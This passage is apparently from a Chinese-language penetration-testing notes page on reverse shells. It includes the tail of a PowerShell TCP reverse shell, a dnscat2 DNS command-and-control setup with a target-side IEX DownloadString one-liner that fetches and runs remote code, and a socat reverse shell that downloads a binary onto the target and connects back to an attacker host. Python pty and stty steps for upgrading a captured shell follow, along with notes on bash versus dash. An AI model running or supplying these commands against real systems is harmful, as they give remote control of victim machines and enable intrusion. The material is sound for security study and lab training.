0, $bytes.Length)) -ne 0)\n  {\n  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)\n  $sendback = (iex $data 2>&1 | Out-String )\n  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '\n  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n  $stream.Write($sendbyte,0,$sendbyte.Length)\n  $stream.Flush()\n  }\n  $client.Close()\n  }\n  ```\n\n## dnscat2 еҸҚеј№DNS shell\n\n[dnscat2](https:\/\/github.com\/iagox86\/dnscat2)жҳҜдёҖдёӘDNSйҡ§йҒ“пјҢж—ЁеңЁйҖҡиҝҮDNSеҚҸи®®еҲӣе»әеҠ еҜҶзҡ„е‘Ҫд»Өе’ҢжҺ§еҲ¶пјҲCпјҶCпјүйҖҡйҒ“гҖӮdnscat2еҲҶдёәдёӨйғЁеҲҶпјҡе®ўжҲ·з«Ҝе’ҢжңҚеҠЎеҷЁгҖӮdnscat2е®ўжҲ·з«ҜйҮҮз”ЁCиҜӯиЁҖзј–еҶҷпјҢжңҚеҠЎеҷЁз«ҜйҮҮз”ЁrubyиҜӯиЁҖзј–еҶҷгҖӮеҗҺжқҘеҸҲжңүе®үе…Ёз ”з©¶дәәе‘ҳдҪҝз”ЁPowerShellи„ҡжң¬йҮҚеҶҷдәҶdnscat2е®ўжҲ·з«Ҝdnscat2-powershell(https:\/\/github.com\/lukebaggett\/dnscat2-powershell).\n\nеҲ©з”Ёdnscat2 е’Ң dnscat2-powershellе®һзҺ°еҸҚеј№DNS shell:\n\n- \n\n- ж”»еҮ»жңәпјҡ\n\n  ```\n  ruby dnscat2.rb --dns \"domain=lltest.com,host=192.168.159.129\" --no-cache -e open\n  ```\n\n  -e open дёҚдҪҝз”ЁеҠ еҜҶиҝһжҺҘпјҢй»ҳи®ӨдҪҝз”ЁеҠ еҜҶ\n  ruby dnscat2.rb вҖ”help жҹҘзңӢеё®еҠ©\n\n- зӣ®ж Үжңәжү§иЎҢпјҡ\n\n  ```powershell\n  powershell IEX (New-Object System.Net.Webclient).DownloadString('https:\/\/raw.githubusercontent.com\/lukebaggett\/dnscat2-powershell\/master\/dnscat2.ps1');Start-Dnscat2 -Domain lltest.com -DNSServer [host]\n  ```\n\n- жҲҗеҠҹеҸҚеј№shellеҗҺпјҢж”»еҮ»иҖ…пјҡ\n\n  ```\n  session -i 1 #иҝӣе…ҘеҲ°session 1\n  shell #жү§иЎҢд№ӢеҗҺдјҡж–°з”ҹжҲҗдёҖдёӘsession йңҖиҰҒйҖҡиҝҮsession -i 2 еҲҮжҚў\n  session -i 2\n  ```\n\n## иЎҘе……пјҲ[иҜҰжғ…](https:\/\/www.anquanke.com\/post\/id\/99793)пјү\n\nиҝҳжңүдёҖдәӣжҜ”иҫғзҺ„еӯҰзҡ„дёңиҘҝпјҢиҝҷйҮҢеҲ—дёҫдёҖжіўпјҢеҸҜиғҪжңүзӮ№иҖҒдҪҶжҳҜеҸҜиғҪдјҡжңүз”ЁпјҢжүҖд»ҘиҝҷйҮҢиҝҳжҳҜеҒҡдёҖдёӘе°Ҹи®°еҪ•пјҢд»ҘеӨҮдёҚж—¶д№ӢйңҖиҰҒгҖӮ\n\n#### Empire з»“еҗҲofficeеҸҚеј№shell\n\n[Empire](https:\/\/github.com\/EmpireProject\/Empire )еҹәдәҺpowershellзҡ„еҗҺжё—йҖҸж”»еҮ»жЎҶжһ¶пјҢеҸҜеҲ©з”Ёoffice е®ҸгҖҒOLEеҜ№иұЎжҸ’е…Ҙжү№еӨ„зҗҶж–Үд»¶гҖҒHTMLеә”з”ЁзЁӢеәҸ(HTAs)зӯүиҝӣиЎҢеҸҚеј№shell\n\n#### еҲ©з”Ёoffice OLEеҜ№иұЎжҸ’е…Ҙbatж–Үд»¶еҸҚеј№shell\n\n#### PowerSploit DLLжіЁе…ҘеҸҚеј№shell\n\n\n\n\n\n^\n# **е®һзҺ°дәӨдә’ејҸshellзҡ„еҮ з§Қж–№жі•**\n\nеҒҮи®ҫдёҖдёӘжғ…еҶөпјҡеҰӮжһңеҪ“еүҚжӢҝеҲ°shellд№ӢеҗҺпјҢжҲ‘д»¬жғіиҰҒдҪҝз”ЁvimгҖҒsuжҲ–иҖ…жғіиҰҒtabиЎҘе…Ёд»Јз ҒгҖҒctrl cз»“жқҹеҪ“еүҚиЎҢд»Јз ҒгҖҒжҲ–иҖ…дҪҝз”Ёеҝ«жҚ·й”®дҪҝз”ЁдёҠдёҖжқЎе‘Ҫд»ӨпјҢиҝҷдёӘж—¶еҖҷиҝҷдёӘshellе№¶дёҚдјҡеҜ№жҲ‘д»¬зҡ„ж“ҚдҪңиҝӣиЎҢе“Қеә”пјҢйӮЈд№ҲиҝҷдёӘж—¶еҖҷе°ұйңҖиҰҒеҚҮзә§shellжҲҗдёәдәӨдә’ејҸе®ҢзҫҺshellпјҢдҪҝе…¶и·ҹжҲ‘д»¬еёёи§„е‘Ҫд»ӨиЎҢж“ҚдҪңдёҖж ·\n\n## python pty\n\n```python\npython -c 'import pty; pty.spawn(\"\/bin\/bash\")'\n```\n\n```python\npython3 -c \"__import__('subprocess').call(['\/bin\/bash'])\"\n```\n\nдҪҶжҳҜеҪ“еүҚжғ…еҶөиҝҳжҳҜдёҚиғҪиЎҘе…Ёд»Јз ҒпјҢеҫ—з”ЁsttyжқҘиҝӣиЎҢдјҳеҢ–пјҢжқҘиҪ¬жҚўжҲҗе®ҢзҫҺshell\n\nеңЁжү§иЎҢе®Ңpythonе‘Ҫд»Өд№ӢеҗҺпјҢжҢүдёӢCtrl+z\n\n```\nLinux дёӯCtrl + c\/d\/z зңӢзқҖйғҪе·®дёҚеӨҡпјҢдҪҶжҳҜиҝҳжҳҜжңүдёҚдёҖж ·зҡ„еҗ«д№ү\nCtrl + c ејәеҲ¶дёӯж–ӯзЁӢеәҸзҡ„жү§иЎҢпјҢиҝӣзЁӢз»Ҳжӯў\nCtrl + d еҸ‘йҖҒEOFдҝЎеҸ·пјҢеҫҲеӨҡзЁӢеәҸжҺҘеҲ°иҝҷдёӘдҝЎеҸ·еҗҺдјҡеҒңжӯў\nCtrl + z е°Ҷд»»еҠЎдёӯжӯўпјҢе…¶е®һе°ұжҳҜе°ҶиҝҷдёӘд»»еҠЎжҡӮеҒң\n```\n\nжҢүдёӢCtrl+zд№ӢеҗҺпјҢncеҸҚеј№зҡ„shellж”ҫе…ҘдәҶеҗҺеҸ°пјҢз•ҢйқўйҖҖеӣһеҲ°дәҶж”»еҮ»дё»жңәеҺҹжң¬зҡ„shell\n\n- `echo $TERM` иҺ·еҸ– termеҖј\n- `stty -a` иҺ·еҸ– rows е’Ң columns зҡ„еҖј\n\n- `stty raw -echo` е…ій—ӯиҫ“е…Ҙеӣһжҳҫ\n- `fg` иҝӣе…ҘеүҚеҸ°пјҢе°ұжҳҜжҠҠеҲҡжүҚдёӯжӯўзҡ„ncиҝһжҺҘжҚЎеӣһжқҘ\n\n- `reset`\n- `export SHELL=bash`\n- `export TERM=[еүҚйқўиҺ·еҸ–зҡ„termеҖј]`\n- `stty [еүҚйқўиҺ·еҸ–зҡ„rowsе’ҢcolumnsеҖј]`\n\nиҝҷдёҖеҘ—еңЁiosзі»з»ҹйҮҢйқўдёҚиө·дҪңз”ЁпјҢдҪҶеңЁkaliеҪ“дёӯж—¶еҸҜд»Ҙе®Ңе…Ёи§ЈеҶізҡ„гҖӮ\n\n## еҚҮзә§ncдёәдәӨдә’shell\n\nиҖҒе®һиҜқжІЎжңүд»Җд№ҲеҢәеҲ«пјҢе°ұдёҠйқўйӮЈж ·пјҢдёҖж ·зҡ„гҖӮ\n\n## дҪҝз”Ёsocat\n\n[socat](https:\/\/github.com\/andrew-d\/static-binaries\/blob\/master\/binaries\/linux\/x86_64\/socat)жҳҜзұ»Unixзі»з»ҹдёӢзҡ„дёҖдёӘе·Ҙе…·пјҢеҸҜд»ҘзңӢдҪңжҳҜ nc зҡ„еҠ ејәзүҲгҖӮжҲ‘д»¬еҸҜд»ҘдҪҝз”ЁsocatжқҘдј йҖ’е®Ңж•ҙзҡ„еёҰжңүttyзҡ„TCPиҝһжҺҘгҖӮзјәзӮ№д№ҹеҫҲжҳҺжҳҫпјҢеҸӘиғҪеңЁlinuxдёӢйқўиҝҗиЎҢгҖӮ\n\nж”»еҮ»жңәпјҡ\n\n```\n# йҰ–е…Ҳе®үиЈ…\n$ sudo apt install socat\n# жү§иЎҢ\n$ socat file:`tty`,raw,echo=0 tcp-listen:[port]\n```\n\nзӣ®ж Үжңәпјҡ\n\n```\n# жҠҠsocatдёҠдј еҲ°зӣ®ж ҮжңәеҷЁдёҠжҲ–иҖ…зӣҙжҺҘдёӢиҪҪ\n$ wget https:\/\/github.com\/andrew-d\/static-binaries\/raw\/master\/binaries\/linux\/x86_64\/socat -O \/tmp\/socat\n# иҝҗиЎҢ\n$ chmod +x \/tmp\/socat\n$ \/tmp\/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[host]:[port]\n```\n\nиҝҷз§Қж–№ејҸеҹәжң¬е’Ңsshзұ»дјјпјҢctrl+Cд№ҹдёҚдјҡзӣҙжҺҘж–ӯејҖгҖӮ\n\n## scriptиҺ·еҸ–pty\n\nжҲ‘д»¬еҸҜд»ҘдҪҝз”Ё Linux зі»з»ҹдёӢзҡ„ `script` е‘Ҫд»ӨпјҢеңЁеј№еӣһжқҘзҡ„ shell дёӢеҲӣе»әдёҖдёӘеёҰжңү tty зҡ„ shell, иҝҷж ·е°ұеҸҜд»ҘеӢүејәдҪҝз”ЁдёҖдёӢ `top` е’Ң `vim`\n\n```\n$ script \/dev\/null\n```\n\nеҰӮжһңдёҚеҠ  `\/dev\/null` зҡ„иҜқпјҢдјҡеңЁеҪ“еүҚи·Ҝеҫ„дёӢз”ҹжҲҗдёҖдёӘеҗҚеӯ—жҳҜ `typescript` зҡ„ж–Үд»¶пјҢи®°еҪ•зқҖеңЁ script з”ҹе‘Ҫе‘ЁжңҹйҮҢдҪ жү§иЎҢзҡ„жүҖжңүе‘Ҫд»Өе’Ңз»“жһңгҖӮ\n\ndemo:\n\n```bash\nC:\\Users\\\nО» nc -lvvp 4444\nlistening on [any] 4444 ...\nconnect to [192.168.2.134] from DESKTOP-IBUUT6H.lan [192.168.2.134] 30567\nubuntu@ubuntu:~$ tty\ntty\nnot a tty\nubuntu@ubuntu:~$ script \/dev\/null\nscript \/dev\/null\nScript started, file is \/dev\/null\nubuntu@ubuntu:~$ tty\ntty\n\/dev\/pts\/1\n```\n\n\n\n## е°ҸзҹҘиҜҶзӮ№жҖ»з»“вҖ”вҖ”е…ідәҺLinuxдёӯ#!\/bin\/bashе’Ң#!\/bin\/shзҡ„еҢәеҲ«\n\n#### #!\n\n`#!`:жҳҜдёҖдёӘзү№ж®Ҡзҡ„иЎЁзӨәз¬ҰпјҢе…¶еҗҺпјҢи·ҹзқҖи§ЈйҮҠжӯӨи„ҡжң¬зҡ„shellи·Ҝеҫ„гҖӮ\n\nйҷӨз¬¬дёҖиЎҢеӨ–пјҢи„ҡжң¬дёӯжүҖжңүд»ҘвҖң#вҖқејҖеӨҙзҡ„иЎҢйғҪжҳҜжіЁйҮҠгҖӮ\n\n- `#!\/bin\/bash`жҲ–`#!\/bin\/sh`еҸӘиғҪж”ҫеңЁз¬¬дёҖиЎҢпјҢеҰӮжһңеҗҺйқўиҝҳжңү#!(еҸӘиҰҒдёҚжҳҜеңЁз¬¬дёҖиЎҢ)пјҢйӮЈд№ҲеҸӘиғҪзңӢжҲҗжҳҜжіЁйҮҠгҖӮ\n\n  > иҝҗиЎҢд№ӢеүҚйңҖиҰҒи®ҫзҪ®shзҡ„иҝҗиЎҢжқғйҷҗ`chmod 777 *`\n\n- еҪ“sourceе‘Ҫд»Өжү§иЎҢжңүй—®йўҳж—¶пјҢbashз»§з»ӯжү§иЎҢдёӢйқўе‘Ҫд»ӨгҖӮ\n\n- зі»з»ҹй»ҳи®Өзҡ„shellжҳҜbashгҖӮ\n\n- \\#!еҗҺйқўзҡ„и·Ҝеҫ„дёҖе®ҡиҰҒжӯЈзЎ®пјҢдёҚжӯЈзЎ®дјҡжҠҘй”ҷ(иҝҷдёӘж–Үд»¶дёҚдјҡиҝҗиЎҢ,жҸҗзӨәи·Ҝеҫ„дёҚеӯҳеңЁ)гҖӮ\n\n#### еҢәеҲ«\n\n- \/bin\/shжҢҮеҗ‘dash,\/bin\/bashжҢҮеҗ‘bash\n- dashзӣёеҪ“дәҺbashзҡ„зІҫз®ҖзүҲ(dashдёҚиғҪдҪҝз”ЁletгҖҒsource зӯүе‘Ҫд»Ө)\n\n> жңүзҡ„ж–Үз« дёҠиҜҙ,иҜҙжҳҜ `#!\/bin\/sh` зҡ„и„ҡжң¬,еҮәй”ҷд№ӢеҗҺдёҚдјҡз»§з»ӯиҝҗиЎҢ,`#!\/bin\/bash`зҡ„и„ҡжң¬,еҮәй”ҷд№ӢеҗҺдјҡз»§з»ӯиҝҗиЎҢ,жҲ‘еңЁUbuntuдёҠиҜ•дәҶдёҖдёӢ...`#!\/bin\/sh` зҡ„и„ҡжң¬иҝҳжҳҜз»§з»ӯиҝҗиЎҢдәҶ;\n>\n> иӢҘжҳҜжғіеҮәй”ҷд№ӢеҗҺеҒңжӯўиҝҗиЎҢ,еңЁ`#!`иЎҢд№ӢеҗҺж·»еҠ дёҖиЎҢ`set -e`,иҝҷж ·еҮәй”ҷд№ӢеҗҺи„ҡжң¬е°ұдјҡеҒңжӯўдәҶ\n\n------\n\nGNU\/Linuxж“ҚдҪңзі»з»ҹдёӯзҡ„**\/bin\/sh**жң¬жҳҜ**bash (Bourne-Again Shell)** зҡ„з¬ҰеҸ·й“ҫжҺҘпјҢдҪҶйүҙдәҺ**bash**иҝҮдәҺеӨҚжқӮпјҢжңүдәәжҠҠ**bash**д»ҺNetBSDз§»жӨҚеҲ°Linuxе№¶жӣҙеҗҚдёә**dash (Debian Almquist Shell)**пјҢе№¶е»әи®®е°Ҷ**\/bin\/sh**жҢҮеҗ‘е®ғпјҢд»ҘиҺ·еҫ—жӣҙеҝ«зҡ„и„ҡжң¬жү§иЎҢйҖҹеәҰгҖӮDash Shell жҜ”Bash Shellе°Ҹзҡ„еӨҡпјҢз¬ҰеҗҲPOSIXж ҮеҮҶгҖӮ\n\nUbuntuз»§жүҝдәҶDebianпјҢжүҖд»Ҙд»Һ**Ubuntu 6.10**ејҖе§Ӣй»ҳи®ӨжҳҜDash ShellгҖӮ\n\nжүҖд»Ҙд№ҹе°ұжҳҜеңЁ**UbuntuдёӯеҸҜд»Ҙи®Өдёә\/bin\/shе°ұжҳҜ\/bin\/dash**, еҰӮжһңжү“з®—дҪҝз”Ёbash, еҸҜзӣҙжҺҘе°Ҷ\/bin\/shиҪҜй“ҫжҺҘеҲ°\/bin\/bash.\n\n```bash\nroot@b3fe92a89f30:\/# ll -h \/bin\/sh \/bin\/bash\n-rwxr-xr-x 4 root root 1.2M Feb 25 12:03 \/bin\/bash*\nlrwxrwxrwx 1 root root    4 Jul 18  2019 \/bin\/sh -> dash*\n```\n\nеә”иҜҘиҜҙпјҢ**\/bin\/sh**дёҺ**\/bin\/bash**иҷҪз„¶еӨ§дҪ“дёҠжІЎд»Җд№ҲеҢәеҲ«пјҢдҪҶд»ҚеӯҳеңЁдёҚеҗҢзҡ„ж ҮеҮҶгҖӮж Үи®°дёә**#!\/bin\/sh**зҡ„и„ҡжң¬дёҚеә”дҪҝз”Ёд»»дҪ•**POSIX**жІЎжңүи§„е®ҡзҡ„зү№жҖ§ (еҰӮ**let**зӯүе‘Ҫд»Ө, дҪҶ**#!\/bin\/bash**еҸҜд»Ҙ)гҖӮDebianжӣҫз»ҸйҮҮз”Ё**\/bin\/bash**жӣҙж”№**\/bin\/dash**пјҢзӣ®зҡ„дҪҝз”Ёжӣҙе°‘зҡ„зЈҒзӣҳз©әй—ҙгҖҒжҸҗдҫӣиҫғе°‘зҡ„еҠҹиғҪгҖҒиҺ·еҸ–жӣҙеҝ«зҡ„йҖҹеәҰгҖӮдҪҶжҳҜеҗҺжқҘз»ҸиҝҮshellи„ҡжң¬жөӢиҜ•еӯҳеңЁиҝҗиЎҢй—®йўҳгҖӮеӣ дёәеҺҹе…ҲеңЁ**bash shell**дёӢеҸҜд»ҘиҝҗиЎҢзҡ„shell script (shell и„ҡжң¬)пјҢеңЁ**\/bin\/sh**дёӢиҝҳжҳҜдјҡеҮәзҺ°дёҖдәӣж„ҸжғідёҚеҲ°зҡ„й—®йўҳпјҢдёҚжҳҜ100%зҡ„е…јз”ЁгҖӮ\n\nдёҠйқўеҸҜд»Ҙиҝҷж ·зҗҶи§ЈпјҢдҪҝз”Ё**man sh**е‘Ҫд»Өе’Ң**man bash**е‘Ҫд»ӨеҺ»и§ӮеҜҹпјҢеҸҜд»ҘеҸ‘зҺ°**sh**жң¬иә«е°ұжҳҜ**dash**пјҢд№ҹе°ұжӣҙеҘҪзҡ„иҜҙжҳҺйӣҶжҲҗDebianзі»з»ҹд№ӢеҗҺзҡ„жӣҙж”№гҖӮ\n\n> еңЁUbuntuдёҠ,\/bin\/shзұ»дјј\/bin\/bashзҡ„зІҫз®ҖзүҲ,жңүдёҚе°‘еҠҹиғҪдёҚиғҪз”Ё,Ubuntuй»ҳи®ӨжҳҜ\/bin\/bash ","meta":{"ctime":"2024-09-08T02:12:19+08:00","mtime":"2024-09-08T02:12:19+08:00"}},"options":{"poweredBy":{"name":"йЎ¶жғідә‘","link":"https:\/\/www.topthink.com"}}}
</script>
